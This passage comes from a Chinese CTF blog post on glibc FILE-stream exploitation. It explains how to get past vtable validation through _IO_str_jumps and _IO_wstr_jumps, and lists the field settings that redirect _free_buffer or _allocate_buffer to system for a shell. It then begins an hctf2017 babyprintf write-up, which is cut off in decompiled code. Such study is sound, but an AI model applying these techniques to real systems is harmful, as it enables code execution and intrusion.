                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022105118674.png"
                      alt="image-20231022105118674"
                ></p>
<h2 id="IO-str-jumps-与-IO-wstr-jumps"><a href="#IO-str-jumps-与-IO-wstr-jumps" class="headerlink" title="_IO_str_jumps 与 _IO_wstr_jumps"></a>_IO_str_jumps 与 _IO_wstr_jumps</h2><p><code>__start___libc_IO_vtables</code>指向第一个 <code>vtable</code> 地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址。想将 <code>vtable</code> 覆盖成外部地址且仍然通过检查，可以有两种方式：</p>
<ol>
<li>使得 <code>flag == &amp;_IO_vtable_check</code></li>
<li>使 <code>_dl_open_hook!= NULL</code></li>
<li>寻找其他位于<code>__start___libc_IO_vtables</code> 和 <code>__stop___libc_IO_vtables</code> 之间的 <code>vtable</code></li>
</ol>
<p>第一种方式不可控，因为 <code>flag</code> 的获取和比对是类似 <code>canary</code> 的方式，其对应的汇编代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_IO_vtable_check+7&gt;     mov    rax, qword ptr [rip + 0x32bb2a] &lt;0x7fefcac69458&gt;</span><br><span class="line">&lt;_IO_vtable_check+14&gt;    ror    rax, 0x11</span><br><span class="line">&lt;_IO_vtable_check+18&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">&lt;_IO_vtable_check+27&gt;    cmp    rax, rdi</span><br></pre></td></tr></table></figure></div>

<p>第二种方式，理论上可行，但是如果我们可以找到存在往<code>_dl_open_hook</code>中写值的方法，完全利用该方法来进行更为简单的利用。</p>
<p>第三种方式， <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 这两个 <code>vtable</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的，只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>_IO_wstr_jumps</code> 地址即可。<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的，利用方式主要有针对 <code>_IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和 <code>_IO_str_overflow</code> 两种。</p>
<p><strong>一些下面用到的结构体定义</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_str_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_str_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_str_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_default_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_str_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_default_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_str_jumps</code> 符号在 <code>strip</code> 后会丢失，定位其地址方法如下：</p>
<ul>
<li><code>_IO_str_jumps</code>是 <code>vtable</code> 中的倒数第二个表，可以通过 <code>vtable</code> 的最后地址减去<code>0x168</code>。</li>
<li><code>IDA</code> 寻找<code>_IO_file_jumps</code> 在后面找到<code>_IO_str_****</code>的函数表即可。</li>
</ul>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022121407625.png"
                      alt="image-20231022121407625"
                ></p>
<p><strong>_IO_str_finish</strong></p>
<p>下面是 <code>_IO_str_finish</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* glibc &lt; 2.28 的实现 */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它使用了 <code>_IO_FILE</code> 结构体中的值当作函数地址来直接调用，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh\x00</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 <code>shell</code> 。</p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li>将 <code>vtable</code> 的地址覆盖成 <code>_IO_str_jumps-0x8</code> 的地址，这样原来 <code>_IO_OVERFLOW</code> 就变成 <code>_IO_str_finish</code>。</li>
<li><code>fp-&gt;_IO_buf_base = &quot;/bin/sh\x00&quot;</code> 作为函数第一个参数。</li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>fp-&gt;_s._free_buffer(fp+0xe8)</code>改为<code>system</code>或<code>one gadget</code>的地址。</li>
</ul>
</blockquote>
<p><strong>_IO_str_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span></span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// not allowed 绕过 _IO_USER_BUF(0x01)</span></span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF)</span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base，这里让 _IO_buf_base = 0;</span></span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</span></span><br><span class="line">	  		_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            <span class="comment">// 函数指针调用 fp+0xe8 = system_addr</span></span><br><span class="line">	  		new_buf= (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即绕过条件为 </p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) / 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) / 2) +1</code> 且<code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
</blockquote>
<p>直接将 <code>vtable-&gt;fake_IO_str_jumps_vtable</code> 即可，因为 <code>_IO_str_overflow</code> 也在 <code>0x18</code> 的位置。</p>
<h3 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a>_IO_wstr_jumps</h3><p>其用法和<code>_IO_str_jumps</code> 相似，<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的。其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_wstr_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_wstr_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, (_IO_overflow_t) _IO_wstr_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wint_t</span><br><span class="line">_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : WEOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  <span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      || __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  new_buf = (<span class="type">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> WEOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __wmemcpy (new_buf, old_buf, old_wblen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  __wmemset (new_buf + old_wblen, <span class="string">L&#x27;\0&#x27;</span>, new_size - old_wblen);</span><br><span class="line"></span><br><span class="line">	  _IO_wsetb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_base =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_end =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_wide_data-&gt;_IO_write_ptr++ = c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_finish</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="glibc-2-28-防御措施"><a href="#glibc-2-28-防御措施" class="headerlink" title="glibc-2.28 防御措施"></a>glibc-2.28 防御措施</h3><p>在 <code>glibc-2.28</code> 版本中，用操作堆的 <code>malloc</code> 函数和 <code>free</code> 函 数 替 换 原 来 在 <code>_IO_str_fields</code> 里 的 <code>_allocate_buffer</code> 和 <code>_free_buffer</code> 。 由 于 不 再 使 用 偏 移 ， 也 就 不 能 利 用 <code>__libc_IO_vtables</code> 上的 <code>vtable</code> 绕过检查，于是新的 <code>FOSP</code> 利用技术 就失效了。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            </span><br><span class="line">	  		new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wstr_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> WEOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  		<span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  	<span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      	|| __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    	<span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  	new_buf = <span class="built_in">malloc</span> (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	...</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2017-babyprintf"><a href="#hctf2017-babyprintf" class="headerlink" title="[hctf2017]babyprintf"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.25_pwn_hctf2017_babyprintf" >[hctf2017]babyprintf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息"><a href="#检查信息" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173157389.png"
                      alt="image-20231022173157389"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173259777.png"
                      alt="image-20231022173259777"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022172848195.png"
                      alt="image-20231022172848195"
                ></p>
<p>开了 <code>NX</code> 和 <code>Canary</code>，题目 <code>libc</code> 为 <code>2.24</code> 版本。</p>
<h3 id="试运行-1"><a href="#试运行-1" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173559457.png"
                      alt="image-20231022173559457"
                ></p>
<h3 id="逆向分析-2"><a href="#逆向分析-2" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">read_n</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;string: &quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(v3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span 